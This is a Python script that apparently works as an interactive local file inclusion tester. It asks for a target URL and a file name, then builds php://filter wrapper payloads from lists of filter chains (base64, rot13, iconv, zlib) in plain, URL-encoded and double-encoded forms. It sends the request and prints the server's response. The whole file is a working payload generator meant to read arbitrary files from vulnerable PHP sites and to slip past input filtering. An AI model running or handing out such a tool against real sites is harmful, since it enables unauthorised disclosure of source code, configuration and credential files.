import requests
from colorama import Fore, Back, Style 

def print_goodbye():
    print("\nGoodbye!")

try:
    url = input("Enter the URL to test: ")
    filename = input("Enter the file name to test: ")

    filter_types = {
      1: "Normal",
      2: "Encoded",
      3: "Double Encoded"
    }

    normal_filters = [
      "convert.iconv.utf-8.utf-16le",
      "read=string.toupper|string.rot13|string.tolower",
      "string.toupper/string.rot13/string.tolower",
      "string.strip_tags",
      "convert.base64-decode",
      "convert.base64-encode",
      "convert.base64-encode|convert.base64-decode",
      "convert.quoted-printable-encode",
      "zlib.deflate/convert.base64-encode"  
    ]

    encoded_filters = [
      "convert%2eiconv%2eutf-8%2eutf-16le",
      "read%3dstring.toupper%7cstring%2erot13%7cstring%2etolower",
      "string%2etoupper%2fstring%2erot13%2fstring%2etolower",
      "string%2estrip_tags",
      "convert%2ebase64-decode",
      "convert%2ebase64-encode",
      "convert%2ebase64-encode%7cconvert%2ebase64-decode",
      "convert%2equoted-printable-encode",
      "zlib%2edeflate%2fconvert%2ebase64-encode"
    ]

    double_encoded_filters = [
      "convert%252eiconv%252eutf-8%252eutf-16le",
      "read%253Dstring%252etoupper%257Cstring%252erot13%257Cstring%252etolower",
      "string%252etoupper%2Fstring%252erot13%2Fstring%252etolower",
      "string%252estrip_tags",
      "convert%252ebase64-decode",
      "convert%252ebase64-encode",  
      "convert%252ebase64-encode%7Cconvert%252ebase64-decode",
      "convert%252equoted-printable-encode",
      "zlib%252edeflate%252Fconvert%252ebase64-encode"
    ]

    url_types = {
      1: "Normal",
      2: "Encoded", 
      3: "Double Encoded"
    }

    print(Fore.GREEN + "Filter Types:")
    for key, value in filter_types.items():
      print(f"{key}. {value}")

    selected_filter_type = int(input("Select filter type: "))

    if selected_filter_type == 1:
      filters = normal_filters
    elif selected_filter_type == 2:
      filters = encoded_filters  
    else:
      filters = double_encoded_filters

    print(Fore.CYAN + "\nAvailable filters:")
    for i, filter in enumerate(filters):
      print(f"{i+1}. {filter}")

    selected_filter = int(input("Select filter to test: "))
    selected_filter = filters[selected_filter - 1]

    print(Fore.YELLOW + "\nURL Encoding Types:")
    for key, value in url_types.items():
      print(f"{key}. {value}")

    selected_url_type = int(input("Select URL encoding type: "))

    if selected_url_type == 1:
      test_url = f"{url}php://filter/{selected_filter}/resource={filename}" 
    elif selected_url_type == 2:
      test_url = f"{url}php%3a%2f%2ffilter%2f{selected_filter}%2fresource%3d{filename}"
    else:
      test_url = f"{url}php%253A%252F%252Ffilter%252F{selected_filter}%252Fresource%253D{filename}"

    print(Fore.MAGENTA + f"\nTesting: {test_url}")

    try:
      response = requests.get(test_url)
      print(response.text)

    except requests.exceptions.MissingSchema:
      print(Fore.RED + "Invalid URL schema")

    print(Style.RESET_ALL)

except KeyboardInterrupt:
    print_goodbye()
